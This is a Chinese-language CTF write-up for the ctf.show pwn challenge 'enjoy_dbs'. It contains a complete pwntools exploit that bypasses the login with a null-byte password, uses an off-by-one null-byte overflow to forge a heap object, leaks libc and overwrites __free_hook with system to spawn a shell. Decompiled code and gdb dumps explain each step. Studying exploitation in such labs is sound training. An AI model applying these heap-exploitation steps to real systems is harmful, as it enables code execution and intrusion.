# enjoy_dbs

[题目地址](https://ctf.show/challenges#enjoy_dbs-3834)

什么新手可以在3题内从命令执行来到堆的世界？

新手杯pwn系列第2题就连wp都看不懂了，这题看了一下直接去看wp了。果然还是看不懂。先放wp，一行一行看。

```python
from pwn import *
#r=process('./pwn3')
r = remote('pwn.challenge.ctf.show',28108)

def ch(i):
        r.sendlineafter('[7].Check log_information',str(i))

def add(name,des):
        ch(1)
        if(len(name)<8):
                r.sendlineafter("please input the name of the onject>>",name)
        else :
                r.sendafter("please input the name of the onject>>",name)

        if(len(des)<0x20):
                r.sendlineafter("then describe it",des)
        else:
                r.sendafter("then describe it",des)

def show(name):
        ch(2)

        r.sendlineafter("you want to check",name)

def free(name):
        ch(3)
        r.sendlineafter("you want to delete",name)


def edit_name(name,newname):
        ch(4)
        r.sendlineafter("you want to modify",name)

        r.sendlineafter("[3]both","1")

        if(len(newname)<8):
                r.sendlineafter("please input the name of the onject>>",newname)
        else :
                r.sendafter("please input the name of the onject>>",newname)

def edit_des(name,des):
        ch(4)
        r.sendlineafter("you want to modify",name)
        r.sendlineafter("[3]both","2")
        if(len(des)<0x20):
                r.sendlineafter("describe it>>",des)
        else:
                r.sendafter("describe it>>",des)

def edit(name,newname,des):
        ch(4)
        r.sendlineafter("you want to modify",name)
        r.sendlineafter("[3]both","3")
        if(len(newname)<8):
                r.sendlineafter("please input the name of the onject>>",newname)
        else :
                r.sendafter("please input the name of the onject>>",newname)
        if(len(des)<0x20):
                r.sendlineafter("describe it>>",des)
        else:
                r.sendafter("describe it>>",des)

def login():
        r.sendafter("please login first!",b'cat_loves_her'.ljust(0x10,b'\x00'))
        r.sendlineafter("password:   ",b'\x00aaaa')

# context.log_level = 'debug'
# gdb.attach(r)
login()
add(b'1111',b'/bin/sh\x00')
add(b'2222',b'ssssss')
add(b'3333',b'ssssss')
add(b'4444',b'ssssss')
add(b'5555',b'ssssss')
add(b'6666',b'ssssss')
add(b'7777',b'ssssss')
edit_name(b'7777',b'7'*8)
edit_des(b'7'*8,p64(6)+b'6'*4+b'\x00'*4+p64(6303784))
show(b'6666')

r.recvuntil("::")
puts_addr = u64(r.recv(6).ljust(8,b'\x00')) 
libc=puts_addr-0x0809c0	
free_hook = 0x00000000003ed8e8+libc
system = 	0x04f440+libc
edit_des(b'7'*8,p64(6)+b'6'*4+b'\x00'*4+p64(free_hook))
edit_des(b'6'*4,p64(system))
free(b'1111')
r.interactive()
```

除去几个函数的交互定义，剩下的内容倒是不复杂。剖析wp总要看一下程序吧。main函数和系列中前面的程序差不多。

```c
undefined8 Main(void)

{
  undefined4 uVar1;
  undefined8 uVar2;
  long in_FS_OFFSET;
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  memset(local_38,0,0x20);
  FUN_0040095a();
  PrintTitle();
  puts("welcome to the second challenge!\nwhat you need to do it to login successfully!");
  puts("then enjoy the game!");
  while (uVar2 = Login(), (int)uVar2 != 0) {
    PrintMenu();
    GetInput((long)local_38,2);
    uVar1 = _atoi(local_38);
    switch(uVar1) {
    default:
      puts("Illegal input");
      break;
    case 1:
      Create();
      break;
    case 2:
      Check();
      break;
    case 3:
      Delete();
      break;
    case 4:
      Modify();
      break;
    case 5:
      IsLogin = 0;
      IsAdmin = 0;
      memset(&DAT_006030e0,0,0x10);
      memset(&DAT_006030f0,0,0x10);
      break;
    case 6:
      _Exit();
      break;
    case 7:
      CheckLogInformation();
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

需要先以管理员身份登陆，不然几个功能都用不了。查看负责登陆的函数。

```c
undefined8 DoLogin(void)

{
  int iVar1;
  ssize_t sVar2;
  long in_FS_OFFSET;
  undefined8 name;
  undefined8 local_40;
  char correct_password [16];
  undefined8 password;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  memset(&name,0,0x10);
  memset(correct_password,0,0x10);
  memset(&password,0,0x10);
  iVar1 = open("/dev/urandom",0);
  if (iVar1 < 1) {
    puts("open error!there is no such file!");
                    /* WARNING: Subroutine does not return */
    _exit(0);
  }
  sVar2 = read(iVar1,correct_password,0x10);
  if (sVar2 < 1) {
    puts("Initialization error. Please check the equipment environment.");
                    /* WARNING: Subroutine does not return */
    _exit(0);
  }
  memset(&name,0,0x10);
  memset(&password,0,0x10);
  puts("please login first!");
  printf("name:       ");
  GetInput((long)&name,0x10);
  printf("password:   ");
  GetInput((long)&password,0x10);
  iVar1 = strcmp((char *)&name,"cat_loves_her");
  if (iVar1 == 0) {
    iVar1 = strcmp((char *)&password,correct_password);
    if (iVar1 == 0) {
      IsAdmin = 1;
    }
    else {
      printf("the password %s is wrong!You can try again !",&password);
      printf("password:   ");
      GetInput((long)&password,0x10);
    }
  }
  IsLogin = 1;
  _DAT_006030e0 = name;
  _DAT_006030e8 = local_40;
  _DAT_006030f0 = password;
  _DAT_006030f8 = local_20;
  printf("%s,welcome to dreamcat\'s easy Databasesystem!\n",&name);
  puts("here you will learn how to play ctfpwn!");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

name需要是cat_loves_her，然而密码就不知道了。看wp直接发送了b'\x00aaaa'，有点疑惑，于是自己实验了一下，把后面的a去掉几个，都能登录上。“肯定是\x00的原因了吧“，我这么想，结果当我发送空的时候，它登录上了！！！多试了几次也是这样。难道发送什么都行？我发送了个a，这回不行了。最后尝试\x00加上任意字符，都能过。看了[strcmp](https://www.runoob.com/cprogramming/c-function-strcmp.html)会比对到\x00结束，然而我自己实验比对就算弄\x00返回结果也不是0。

往下看吧。

```c
void Create(void)

{
  long *__s;
  void *__s_00;
  int local_1c;
  
  if (IsAdmin == 0) {
    puts("you are not permitted to do this!");
  }
  else {
    local_1c = 0;
    while (*(long *)(&DAT_00603100 + (long)local_1c * 8) != 0) {
      local_1c = local_1c + 1;
    }
    if (local_1c < 8) {
      __s = (long *)malloc(0x30);
      memset(__s,0,0x38);
      puts("please input the name of the onject>>   ");
      GetInput((long)(__s + 1),8);
      puts("and then describe it ");
      __s_00 = malloc(0x20);
      memset(__s_00,0,0x20);
      GetInput((long)__s_00,0x20);
      __s[2] = (long)__s_00;
      *(long **)(&DAT_00603100 + (long)local_1c * 8) = __s;
      *__s = (long)local_1c;
    }
    else {
      puts("on no,the db is full!");
    }
  }
  return;
}
```

只能malloc 8个块,每次创建object都会在分配到的指针+1地址处存放object的名字，然后再分配一个指针用来装描述。把wp中用到的函数全部看一遍。

```c
void Modify(void)

{
  int iVar1;
  long in_FS_OFFSET;
  int local_30;
  char local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (IsAdmin == 0) {
    puts("you are not permitted to do this!");
  }
  else {
    memset(local_28,0,0x10);
    puts("please input the name of the object you want to modify>>  ");
    GetInput((long)local_28,0x10);
    local_30 = 0;
    while ((local_30 < 8 &&
           ((*(long *)(&DAT_00603100 + (long)local_30 * 8) == 0 ||
            (iVar1 = strcmp(local_28,(char *)(*(long *)(&DAT_00603100 + (long)local_30 * 8) + 8)),
            iVar1 != 0))))) {
      local_30 = local_30 + 1;
    }
    if (local_30 < 8) {
      puts(">>    [1]only rename");
      puts("      [2]only redescribe");
      puts("      [3]both");
      memset(local_28,0,0x10);
      GetInput((long)local_28,8);
      iVar1 = _atoi(local_28);
      if ((iVar1 == 1) || (iVar1 == 3)) {
        puts("please input the name of the onject>>   ");
        GetInput(*(long *)(&DAT_00603100 + (long)local_30 * 8) + 8,8);
      }
      if ((iVar1 == 2) || (iVar1 == 3)) {
        puts("emememememmm,describe it>>    ");
        GetInput(*(long *)(*(long *)(&DAT_00603100 + (long)local_30 * 8) + 0x10),0x20);
      }
    }
    else {
      puts("maybe you forget it !>_<!");
    }
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

输入要修改的object名字，在DAT_00603100中搜索是否有匹配的名字。结合上个函数可以把DAT_00603100看作数据库，用于装object。查找到匹配的名字后把所在的索引记住，后续重命名和改描述都用到了。

```c
void Check(void)

{
  int iVar1;
  long in_FS_OFFSET;
  int local_2c;
  char local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  memset(local_28,0,0x10);
  puts("please input the name of the object you want to check>>  ");
  GetInput((long)local_28,0x10);
  local_2c = 0;
  while ((local_2c < 8 &&
         ((*(long *)(&DAT_00603100 + (long)local_2c * 8) == 0 ||
          (iVar1 = strcmp(local_28,(char *)(*(long *)(&DAT_00603100 + (long)local_2c * 8) + 8)),
          iVar1 != 0))))) {
    local_2c = local_2c + 1;
  }
  if (local_2c < 8) {
    printf("%s\'s id is %ld ::%s",local_28,**(undefined8 **)(&DAT_00603100 + (long)local_2c * 8),
           *(undefined8 *)(*(long *)(&DAT_00603100 + (long)local_2c * 8) + 0x10));
  }
  else {
    puts("maybe you forget it !>_<!");
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

展示物品信息，包括名字和描述。开始还是根据名字找索引，后面用这个索引打印物品信息。粗略看了一遍，我在wp已知的情况下还没看出漏洞。首先看wp可知使用的方法是修改free的got表位system，这样free物品时如果里面有/bin/sh就能直接getshell了，也是第一个物品描述填/bin/sh的原因。\x00是为了防止后面连着东西妨碍getshell。

使用gdb进行调试理解后续的内容。让程序在创建所有堆块后修改名字前断开，DAT_00603100情况如下。

- (gdb) $ x/10g 0x00603100
<br>0x603100:    0x00000000021a52a0    0x00000000021a5310
<br>0x603110:    0x00000000021a5380    0x00000000021a53f0
<Br>0x603120:    0x00000000021a5460    0x00000000021a54d0
<br>0x603130:    0x00000000021a5540    0x00000000021a55b0
<Br>0x603140:    0x0000000000000000    0x0000000000000000

x表示检查内存，10表示检查10个，g表示按8字节显示。看起来有8个块，但第一个地址并不是我们创建的object，是main函数中FUN_0040095a()创建的内容，不重要就不多说了。看第一个object的结构。

- (gdb) $ x/16b 0x00000000021a5310
<br>0x21a5310:    "\001"
<br>0x21a5312:    ""
<br>0x21a5313:    ""
<br>0x21a5314:    ""
<br>0x21a5315:    ""
<br>0x21a5316:    ""
<br>0x21a5317:    ""
<br>0x21a5318:    "1111"
<br>0x21a531d:    ""
<br>0x21a531e:    ""
<br>0x21a531f:    ""
<br>0x21a5320:    "PS\032\002"
<br>0x21a5325:    ""
<br>0x21a5326:    ""
<br>0x21a5327:    ""
<br>0x21a5328:    ""

b表示按单字节显示。\001是当前块的索引，在create函数末尾的*__s = (long)local_1c;有赋值。0x21a5318处是object的名称，对应GetInput((long)(__s + 1),8);，已知__s是0x21a5310，那__s + 1相当于数组索引1，即__s[1]。又因为__s类型为指针，长8字节，把它当作数组时取索引每+1，地址+8。0x21a5320处还是个指针，所以这里显示是乱码，如果当作指针打印里面的内容会发现是我们填写的描述。

- (gdb) $ x/s *0x21a5320
<br>0x21a5350:    "/bin/sh"

此处对应__s[2] = (long)__s_00;。能发现与__s的偏移是16（gdb里地址显示跳着来的，不要看错了），符合索引。剩下几个堆块都是同样的结构。现在让我们看看如果使用edit_name将第7个堆块的名字改为8个字符会发生什么事。（下面的内容每次地址都不一样，不过结构什么的都是一样的）。

- (gdb) $ x/16g 0x0000000001d3e5b0
<br>0x1d3e5b0:    0x0000000000000007    0x3737373737373737
<br>0x1d3e5c0:    0x0000000001d3e500    0x0000000000000000
<br>0x1d3e5d0:    0x0000000000000000    0x0000000000000000
<br>0x1d3e5e0:    0x0000000000000000    0x0000000000000031
<br>0x1d3e5f0:    0x0000737373737373    0x0000000000000000
<br>0x1d3e600:    0x0000000000000000    0x0000000000000000
<br>0x1d3e610:    0x0000000000000000    0x00000000000209f1
<br>0x1d3e620:    0x0000000000000000    0x0000000000000000
<Br>(gdb) $ x/s 0x1d3e5b0+8
<Br>0x1d3e5b8:    "77777777"

查看第7个堆块，名字确实改变了。再仔细看看，改变的只有地址吗？我们发现原本指向描述的指针被改成了0x0000000001d3e500，本来应该是0x1d3e5f0的。为什么一个\x00跑出去了呢？这就要看看GetInput函数了。

```c
int GetInput(long param_1,int param_2)

{
  ssize_t sVar1;
  int i;
  
  for (i = 0; i < param_2; i = i + 1) {
    sVar1 = read(0,(void *)(param_1 + i),1);
    if ((int)sVar1 < 1) {
      return -1;
    }
    if (*(char *)(param_1 + i) == '\n') break;
  }
  *(undefined *)(param_1 + i) = 0;
  return i;
}
```

末尾的*(undefined *)(param_1 + i) = 0;让读取内容时多了个\x00，这个\x00会溢出到下一个地址的低位，覆盖了本来正确的描述指针。下一次我们再edit des时，编辑的其实是这个指针里的内容。这个指针指向的内容目前是空的，最重要的一点，它一定会比原本的第6个堆块地址小。如果我们按照wp里编辑后会得到什么呢？


- (gdb) $ x/32g 0x00000000010c9500
<Br>0x10c9500:    0x0000000000000006    0x0000000036363636
<Br>0x10c9510:    0x0000000000603028    0x0000000000000000
<Br>0x10c9520:    0x0000000000000000    0x0000000000000000
<Br>0x10c9530:    0x0000000000000000    0x0000000000000041
<Br>0x10c9540:    0x0000000000000006    0x0000000036363636
<Br>0x10c9550:    0x00000000010c9580    0x0000000000000000
<Br>0x10c9560:    0x0000000000000000    0x0000000000000000
<Br>0x10c9570:    0x0000000000000000    0x0000000000000031
<Br>0x10c9580:    0x0000737373737373    0x0000000000000000
<Br>0x10c9590:    0x0000000000000000    0x0000000000000000
<Br>0x10c95a0:    0x0000000000000000    0x0000000000000041
<Br>0x10c95b0:    0x0000000000000007    0x3737373737373737
<Br>0x10c95c0:    0x00000000010c9500    0x0000000000000000
<Br>0x10c95d0:    0x0000000000000000    0x0000000000000000
<Br>0x10c95e0:    0x0000000000000000    0x0000000000000031
<Br>0x10c95f0:    0x0000737373737373    0x0000000000000000

发现了吗，真正的第六个堆块0x10c9540上面冒出来了一个假堆块，正是我们通过溢出改变指针后的内容。edit des中发送的payload不是乱写的，我们按照题目堆块的结构伪造了一个假堆块，一切都和真堆块一样，除了指向des的指针，是puts的got表。接下来我们打印名字为6666的堆块，会打印哪个？答案是我们的假堆块，因为它的地址比真堆块低，按照打印函数的逻辑，优先选地址最低的堆块打印。由此泄露了put的地址。

接下来就很简单了，算free_hook和system的地址，修改77777777堆块的des，也就是假堆块的des为free_hook的地址，再编辑6666堆块就能直接改成system了，和上面一样。最后free第一个堆块其实就是在调用system，提前写的/bin/sh发挥作用，getshell。